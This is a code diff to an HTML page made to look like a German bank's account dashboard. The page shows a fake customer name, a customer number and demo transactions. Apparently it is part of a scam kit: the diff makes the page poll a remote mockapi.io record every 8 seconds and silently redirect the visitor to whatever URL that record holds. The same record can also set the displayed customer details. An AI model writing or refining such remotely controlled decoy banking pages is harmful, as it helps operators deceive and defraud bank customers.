@@ -51,7 +51,6 @@ body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6ee
 <body>
 <div class="wrap">
 
-<!-- Updated logo (clean URL) -->
 <img class="logo" src="https://raw.githubusercontent.com/javad-niroumand/Lisa/main/ChatGPT%20Image%20Nov%2025%2C%202025%2C%2002_43_24%20PM%20(1).png" alt="Bank Logo">
 
 <div class="card user-info">
@@ -71,15 +70,10 @@ body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6ee
 </div>
 
 <script>
-// ---------------------------------------------
-// Redirect logic
-// Replace this with your real API endpoint later
-// ---------------------------------------------
-const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments/12345";
-const REDIRECT_URL = "https://insurance-three-indol.vercel.app/";
+const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments";
 let redirectTriggered = false;
 
-// Demo transactions (static)
+// Static demo transactions
 const transactions = [
   {name:'Miete', category:'Rent', amount:1200, date:'2025-11-24', logo:'https://i.etsystatic.com/12773587/r/il/63d810/1121816918/il_570xN.1121816918_nwl8.jpg'},
   {name:'Stromrechnung', category:'Electricity', amount:85, date:'2025-11-23', logo:'https://cdn-icons-png.flaticon.com/512/2910/2910766.png'},
@@ -98,7 +92,6 @@ function formatCurrency(n){
 function renderTransactions(){
   const container = document.getElementById('transactionList');
   container.innerHTML = '';
-
   transactions.forEach(t=>{
     const li = document.createElement('li');
     li.className = 'transaction-item';
@@ -114,26 +107,34 @@ function renderTransactions(){
     `;
     container.appendChild(li);
   });
-
   document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
 }
 
 // --------------------------------------------------
-// AUTO CHECK FOR update2 FLAG EVERY 8 SECONDS
-// Redirects without popup
+// AUTO CHECK FOR update2 FLAG AND REDIRECT TO API URL VALUE
 // --------------------------------------------------
 async function checkRedirect(){
   try {
     const res = await fetch(API_URL, {cache:"no-store"});
     const data = await res.json();
 
-    if(data.update2 === true && !redirectTriggered){
+    // Using first object in array
+    const record = data[0];
+    const redirectUrl = record.url || null;
+
+    if(record.update2 === true && redirectUrl && !redirectTriggered){
       redirectTriggered = true;
-      window.location.href = REDIRECT_URL;
+      window.location.href = redirectUrl;
     }
 
-    if(data.update2 === false){
+    if(record.update2 === false){
       redirectTriggered = false;
+    }
+
+    // Optional: update user info from API
+    if(record.user){
+      document.getElementById('userName').textContent = record.user.name;
+      document.getElementById('customerNumber').textContent = 'Kundennummer #' + record.user.customerNumber;
     }
 
   } catch(err){
@@ -141,20 +142,15 @@ async function checkRedirect(){
   }
 }
 
-// User info
-document.getElementById('userName').textContent = 'Eugen Ensinger';
-document.getElementById('customerNumber').textContent = 'Kundennummer #984321';
-
 // Refresh button
 document.getElementById('refreshBtn').addEventListener('click', renderTransactions);
 
 // Initial render
 renderTransactions();
 
-// Start auto redirect polling
+// Start auto redirect polling every 8 seconds
 setInterval(checkRedirect, 8000);
 checkRedirect();
 </script>
 </body>
 </html>
-
